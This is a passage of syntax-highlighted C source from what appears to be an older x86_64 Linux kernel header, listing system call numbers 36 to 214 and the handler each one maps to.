class="line">__SYSCALL(__NR_getitimer, sys_getitimer)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm              37</span></span><br><span class="line">__SYSCALL(__NR_alarm, sys_alarm)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setitimer              38</span></span><br><span class="line">__SYSCALL(__NR_setitimer, sys_setitimer)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpid             39</span></span><br><span class="line">__SYSCALL(__NR_getpid, sys_getpid)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendfile               40</span></span><br><span class="line">__SYSCALL(__NR_sendfile, sys_sendfile64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socket             41</span></span><br><span class="line">__SYSCALL(__NR_socket, sys_socket)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_connect                42</span></span><br><span class="line">__SYSCALL(__NR_connect, sys_connect)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_accept             43</span></span><br><span class="line">__SYSCALL(__NR_accept, sys_accept)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendto             44</span></span><br><span class="line">__SYSCALL(__NR_sendto, sys_sendto)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvfrom               45</span></span><br><span class="line">__SYSCALL(__NR_recvfrom, sys_recvfrom)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sendmsg                46</span></span><br><span class="line">__SYSCALL(__NR_sendmsg, sys_sendmsg)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_recvmsg                47</span></span><br><span class="line">__SYSCALL(__NR_recvmsg, sys_recvmsg)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shutdown               48</span></span><br><span class="line">__SYSCALL(__NR_shutdown, sys_shutdown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_bind               49</span></span><br><span class="line">__SYSCALL(__NR_bind, sys_bind)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listen             50</span></span><br><span class="line">__SYSCALL(__NR_listen, sys_listen)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockname            51</span></span><br><span class="line">__SYSCALL(__NR_getsockname, sys_getsockname)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpeername            52</span></span><br><span class="line">__SYSCALL(__NR_getpeername, sys_getpeername)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_socketpair             53</span></span><br><span class="line">__SYSCALL(__NR_socketpair, sys_socketpair)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsockopt             54</span></span><br><span class="line">__SYSCALL(__NR_setsockopt, sys_setsockopt)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsockopt             55</span></span><br><span class="line">__SYSCALL(__NR_getsockopt, sys_getsockopt)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clone              56</span></span><br><span class="line">__SYSCALL(__NR_clone, stub_clone)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fork               57</span></span><br><span class="line">__SYSCALL(__NR_fork, stub_fork)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vfork              58</span></span><br><span class="line">__SYSCALL(__NR_vfork, stub_vfork)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_execve             59</span></span><br><span class="line">__SYSCALL(__NR_execve, stub_execve)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit               60</span></span><br><span class="line">__SYSCALL(__NR_exit, sys_exit)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_wait4              61</span></span><br><span class="line">__SYSCALL(__NR_wait4, sys_wait4)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kill               62</span></span><br><span class="line">__SYSCALL(__NR_kill, sys_kill)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uname              63</span></span><br><span class="line">__SYSCALL(__NR_uname, sys_uname)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semget             64</span></span><br><span class="line">__SYSCALL(__NR_semget, sys_semget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semop              65</span></span><br><span class="line">__SYSCALL(__NR_semop, sys_semop)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semctl             66</span></span><br><span class="line">__SYSCALL(__NR_semctl, sys_semctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_shmdt              67</span></span><br><span class="line">__SYSCALL(__NR_shmdt, sys_shmdt)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgget             68</span></span><br><span class="line">__SYSCALL(__NR_msgget, sys_msgget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgsnd             69</span></span><br><span class="line">__SYSCALL(__NR_msgsnd, sys_msgsnd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgrcv             70</span></span><br><span class="line">__SYSCALL(__NR_msgrcv, sys_msgrcv)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_msgctl             71</span></span><br><span class="line">__SYSCALL(__NR_msgctl, sys_msgctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fcntl              72</span></span><br><span class="line">__SYSCALL(__NR_fcntl, sys_fcntl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flock              73</span></span><br><span class="line">__SYSCALL(__NR_flock, sys_flock)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsync              74</span></span><br><span class="line">__SYSCALL(__NR_fsync, sys_fsync)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fdatasync              75</span></span><br><span class="line">__SYSCALL(__NR_fdatasync, sys_fdatasync)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_truncate               76</span></span><br><span class="line">__SYSCALL(__NR_truncate, sys_truncate)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ftruncate              77</span></span><br><span class="line">__SYSCALL(__NR_ftruncate, sys_ftruncate)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents               78</span></span><br><span class="line">__SYSCALL(__NR_getdents, sys_getdents)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcwd             79</span></span><br><span class="line">__SYSCALL(__NR_getcwd, sys_getcwd)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chdir              80</span></span><br><span class="line">__SYSCALL(__NR_chdir, sys_chdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchdir             81</span></span><br><span class="line">__SYSCALL(__NR_fchdir, sys_fchdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rename             82</span></span><br><span class="line">__SYSCALL(__NR_rename, sys_rename)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdir              83</span></span><br><span class="line">__SYSCALL(__NR_mkdir, sys_mkdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rmdir              84</span></span><br><span class="line">__SYSCALL(__NR_rmdir, sys_rmdir)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_creat              85</span></span><br><span class="line">__SYSCALL(__NR_creat, sys_creat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_link               86</span></span><br><span class="line">__SYSCALL(__NR_link, sys_link)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlink             87</span></span><br><span class="line">__SYSCALL(__NR_unlink, sys_unlink)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlink                88</span></span><br><span class="line">__SYSCALL(__NR_symlink, sys_symlink)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlink               89</span></span><br><span class="line">__SYSCALL(__NR_readlink, sys_readlink)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chmod              90</span></span><br><span class="line">__SYSCALL(__NR_chmod, sys_chmod)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmod             91</span></span><br><span class="line">__SYSCALL(__NR_fchmod, sys_fchmod)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chown              92</span></span><br><span class="line">__SYSCALL(__NR_chown, sys_chown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchown             93</span></span><br><span class="line">__SYSCALL(__NR_fchown, sys_fchown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lchown             94</span></span><br><span class="line">__SYSCALL(__NR_lchown, sys_lchown)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umask              95</span></span><br><span class="line">__SYSCALL(__NR_umask, sys_umask)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday           96</span></span><br><span class="line">__SYSCALL(__NR_gettimeofday, sys_gettimeofday)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrlimit              97</span></span><br><span class="line">__SYSCALL(__NR_getrlimit, sys_getrlimit)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getrusage              98</span></span><br><span class="line">__SYSCALL(__NR_getrusage, sys_getrusage)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysinfo                99</span></span><br><span class="line">__SYSCALL(__NR_sysinfo, sys_sysinfo)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_times              100</span></span><br><span class="line">__SYSCALL(__NR_times, sys_times)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ptrace             101</span></span><br><span class="line">__SYSCALL(__NR_ptrace, sys_ptrace)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getuid             102</span></span><br><span class="line">__SYSCALL(__NR_getuid, sys_getuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_syslog             103</span></span><br><span class="line">__SYSCALL(__NR_syslog, sys_syslog)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* at the very end the stuff that never runs during the benchmarks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgid             104</span></span><br><span class="line">__SYSCALL(__NR_getgid, sys_getgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setuid             105</span></span><br><span class="line">__SYSCALL(__NR_setuid, sys_setuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgid             106</span></span><br><span class="line">__SYSCALL(__NR_setgid, sys_setgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_geteuid                107</span></span><br><span class="line">__SYSCALL(__NR_geteuid, sys_geteuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getegid                108</span></span><br><span class="line">__SYSCALL(__NR_getegid, sys_getegid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpgid                109</span></span><br><span class="line">__SYSCALL(__NR_setpgid, sys_setpgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getppid                110</span></span><br><span class="line">__SYSCALL(__NR_getppid, sys_getppid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgrp                111</span></span><br><span class="line">__SYSCALL(__NR_getpgrp, sys_getpgrp)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setsid             112</span></span><br><span class="line">__SYSCALL(__NR_setsid, sys_setsid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setreuid               113</span></span><br><span class="line">__SYSCALL(__NR_setreuid, sys_setreuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setregid               114</span></span><br><span class="line">__SYSCALL(__NR_setregid, sys_setregid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getgroups              115</span></span><br><span class="line">__SYSCALL(__NR_getgroups, sys_getgroups)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setgroups              116</span></span><br><span class="line">__SYSCALL(__NR_setgroups, sys_setgroups)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresuid              117</span></span><br><span class="line">__SYSCALL(__NR_setresuid, sys_setresuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresuid              118</span></span><br><span class="line">__SYSCALL(__NR_getresuid, sys_getresuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setresgid              119</span></span><br><span class="line">__SYSCALL(__NR_setresgid, sys_setresgid)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getresgid              120</span></span><br><span class="line">__SYSCALL(__NR_getresgid, sys_getresgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpgid                121</span></span><br><span class="line">__SYSCALL(__NR_getpgid, sys_getpgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsuid               122</span></span><br><span class="line">__SYSCALL(__NR_setfsuid, sys_setfsuid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setfsgid               123</span></span><br><span class="line">__SYSCALL(__NR_setfsgid, sys_setfsgid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getsid             124</span></span><br><span class="line">__SYSCALL(__NR_getsid, sys_getsid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capget             125</span></span><br><span class="line">__SYSCALL(__NR_capget, sys_capget)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_capset             126</span></span><br><span class="line">__SYSCALL(__NR_capset, sys_capset)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigpending          127</span></span><br><span class="line">__SYSCALL(__NR_rt_sigpending, sys_rt_sigpending)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigtimedwait            128</span></span><br><span class="line">__SYSCALL(__NR_rt_sigtimedwait, sys_rt_sigtimedwait)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigqueueinfo            129</span></span><br><span class="line">__SYSCALL(__NR_rt_sigqueueinfo, sys_rt_sigqueueinfo)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigsuspend          130</span></span><br><span class="line">__SYSCALL(__NR_rt_sigsuspend, stub_rt_sigsuspend)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sigaltstack            131</span></span><br><span class="line">__SYSCALL(__NR_sigaltstack, stub_sigaltstack)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utime              132</span></span><br><span class="line">__SYSCALL(__NR_utime, sys_utime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknod              133</span></span><br><span class="line">__SYSCALL(__NR_mknod, sys_mknod)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Only needed for a.out */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_uselib             134</span></span><br><span class="line">__SYSCALL(__NR_uselib, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_personality            135</span></span><br><span class="line">__SYSCALL(__NR_personality, sys_personality)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ustat              136</span></span><br><span class="line">__SYSCALL(__NR_ustat, sys_ustat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_statfs             137</span></span><br><span class="line">__SYSCALL(__NR_statfs, sys_statfs)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstatfs                138</span></span><br><span class="line">__SYSCALL(__NR_fstatfs, sys_fstatfs)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sysfs              139</span></span><br><span class="line">__SYSCALL(__NR_sysfs, sys_sysfs)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpriority            140</span></span><br><span class="line">__SYSCALL(__NR_getpriority, sys_getpriority)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setpriority            141</span></span><br><span class="line">__SYSCALL(__NR_setpriority, sys_setpriority)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setparam         142</span></span><br><span class="line">__SYSCALL(__NR_sched_setparam, sys_sched_setparam)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getparam         143</span></span><br><span class="line">__SYSCALL(__NR_sched_getparam, sys_sched_getparam)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setscheduler         144</span></span><br><span class="line">__SYSCALL(__NR_sched_setscheduler, sys_sched_setscheduler)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getscheduler         145</span></span><br><span class="line">__SYSCALL(__NR_sched_getscheduler, sys_sched_getscheduler)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_max     146</span></span><br><span class="line">__SYSCALL(__NR_sched_get_priority_max, sys_sched_get_priority_max)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_get_priority_min     147</span></span><br><span class="line">__SYSCALL(__NR_sched_get_priority_min, sys_sched_get_priority_min)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_rr_get_interval      148</span></span><br><span class="line">__SYSCALL(__NR_sched_rr_get_interval, sys_sched_rr_get_interval)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlock              149</span></span><br><span class="line">__SYSCALL(__NR_mlock, sys_mlock)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlock                150</span></span><br><span class="line">__SYSCALL(__NR_munlock, sys_munlock)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mlockall               151</span></span><br><span class="line">__SYSCALL(__NR_mlockall, sys_mlockall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_munlockall             152</span></span><br><span class="line">__SYSCALL(__NR_munlockall, sys_munlockall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vhangup                153</span></span><br><span class="line">__SYSCALL(__NR_vhangup, sys_vhangup)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_modify_ldt             154</span></span><br><span class="line">__SYSCALL(__NR_modify_ldt, sys_modify_ldt)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pivot_root             155</span></span><br><span class="line">__SYSCALL(__NR_pivot_root, sys_pivot_root)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR__sysctl                156</span></span><br><span class="line">__SYSCALL(__NR__sysctl, sys_sysctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_prctl              157</span></span><br><span class="line">__SYSCALL(__NR_prctl, sys_prctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_arch_prctl             158</span></span><br><span class="line">__SYSCALL(__NR_arch_prctl, sys_arch_prctl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_adjtimex               159</span></span><br><span class="line">__SYSCALL(__NR_adjtimex, sys_adjtimex)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setrlimit              160</span></span><br><span class="line">__SYSCALL(__NR_setrlimit, sys_setrlimit)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_chroot             161</span></span><br><span class="line">__SYSCALL(__NR_chroot, sys_chroot)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync               162</span></span><br><span class="line">__SYSCALL(__NR_sync, sys_sync)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_acct               163</span></span><br><span class="line">__SYSCALL(__NR_acct, sys_acct)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_settimeofday           164</span></span><br><span class="line">__SYSCALL(__NR_settimeofday, sys_settimeofday)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mount              165</span></span><br><span class="line">__SYSCALL(__NR_mount, sys_mount)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_umount2                166</span></span><br><span class="line">__SYSCALL(__NR_umount2, sys_umount)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapon             167</span></span><br><span class="line">__SYSCALL(__NR_swapon, sys_swapon)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_swapoff                168</span></span><br><span class="line">__SYSCALL(__NR_swapoff, sys_swapoff)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_reboot             169</span></span><br><span class="line">__SYSCALL(__NR_reboot, sys_reboot)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sethostname            170</span></span><br><span class="line">__SYSCALL(__NR_sethostname, sys_sethostname)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setdomainname          171</span></span><br><span class="line">__SYSCALL(__NR_setdomainname, sys_setdomainname)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_iopl               172</span></span><br><span class="line">__SYSCALL(__NR_iopl, stub_iopl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioperm             173</span></span><br><span class="line">__SYSCALL(__NR_ioperm, sys_ioperm)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_create_module          174</span></span><br><span class="line">__SYSCALL(__NR_create_module, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_init_module            175</span></span><br><span class="line">__SYSCALL(__NR_init_module, sys_init_module)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_delete_module          176</span></span><br><span class="line">__SYSCALL(__NR_delete_module, sys_delete_module)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_kernel_syms            177</span></span><br><span class="line">__SYSCALL(__NR_get_kernel_syms, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_query_module           178</span></span><br><span class="line">__SYSCALL(__NR_query_module, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_quotactl               179</span></span><br><span class="line">__SYSCALL(__NR_quotactl, sys_quotactl)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_nfsservctl             180</span></span><br><span class="line">__SYSCALL(__NR_nfsservctl, sys_nfsservctl)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* reserved for LiS/STREAMS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getpmsg                181</span></span><br><span class="line">__SYSCALL(__NR_getpmsg, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_putpmsg                182</span></span><br><span class="line">__SYSCALL(__NR_putpmsg, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* reserved for AFS */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_afs_syscall            183</span></span><br><span class="line">__SYSCALL(__NR_afs_syscall, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* reserved for tux */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tuxcall                184</span></span><br><span class="line">__SYSCALL(__NR_tuxcall, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_security               185</span></span><br><span class="line">__SYSCALL(__NR_security, sys_ni_syscall)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettid             186</span></span><br><span class="line">__SYSCALL(__NR_gettid, sys_gettid)</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readahead              187</span></span><br><span class="line">__SYSCALL(__NR_readahead, sys_readahead)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_setxattr               188</span></span><br><span class="line">__SYSCALL(__NR_setxattr, sys_setxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lsetxattr              189</span></span><br><span class="line">__SYSCALL(__NR_lsetxattr, sys_lsetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsetxattr              190</span></span><br><span class="line">__SYSCALL(__NR_fsetxattr, sys_fsetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getxattr               191</span></span><br><span class="line">__SYSCALL(__NR_getxattr, sys_getxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lgetxattr              192</span></span><br><span class="line">__SYSCALL(__NR_lgetxattr, sys_lgetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fgetxattr              193</span></span><br><span class="line">__SYSCALL(__NR_fgetxattr, sys_fgetxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_listxattr              194</span></span><br><span class="line">__SYSCALL(__NR_listxattr, sys_listxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_llistxattr             195</span></span><br><span class="line">__SYSCALL(__NR_llistxattr, sys_llistxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_flistxattr             196</span></span><br><span class="line">__SYSCALL(__NR_flistxattr, sys_flistxattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_removexattr            197</span></span><br><span class="line">__SYSCALL(__NR_removexattr, sys_removexattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lremovexattr           198</span></span><br><span class="line">__SYSCALL(__NR_lremovexattr, sys_lremovexattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fremovexattr           199</span></span><br><span class="line">__SYSCALL(__NR_fremovexattr, sys_fremovexattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tkill              200</span></span><br><span class="line">__SYSCALL(__NR_tkill, sys_tkill)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time               201</span></span><br><span class="line">__SYSCALL(__NR_time, sys_time)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futex              202</span></span><br><span class="line">__SYSCALL(__NR_futex, sys_futex)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_setaffinity          203</span></span><br><span class="line">__SYSCALL(__NR_sched_setaffinity, sys_sched_setaffinity)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sched_getaffinity          204</span></span><br><span class="line">__SYSCALL(__NR_sched_getaffinity, sys_sched_getaffinity)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_thread_area            205</span></span><br><span class="line">__SYSCALL(__NR_set_thread_area, sys_ni_syscall) <span class="comment">/* use arch_prctl */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_setup               206</span></span><br><span class="line">__SYSCALL(__NR_io_setup, sys_io_setup)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_destroy             207</span></span><br><span class="line">__SYSCALL(__NR_io_destroy, sys_io_destroy)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_getevents           208</span></span><br><span class="line">__SYSCALL(__NR_io_getevents, sys_io_getevents)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_submit              209</span></span><br><span class="line">__SYSCALL(__NR_io_submit, sys_io_submit)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_io_cancel              210</span></span><br><span class="line">__SYSCALL(__NR_io_cancel, sys_io_cancel)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_thread_area            211</span></span><br><span class="line">__SYSCALL(__NR_get_thread_area, sys_ni_syscall) <span class="comment">/* use arch_prctl */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_lookup_dcookie         212</span></span><br><span class="line">__SYSCALL(__NR_lookup_dcookie, sys_lookup_dcookie)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_create           213</span></span><br><span class="line">__SYSCALL(__NR_epoll_create, sys_epoll_create)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl_old          214</span></span><br><span class="line">__SYSCALL(__NR_epoll_ctl_old, sys_ni_syscall)</span><br><span 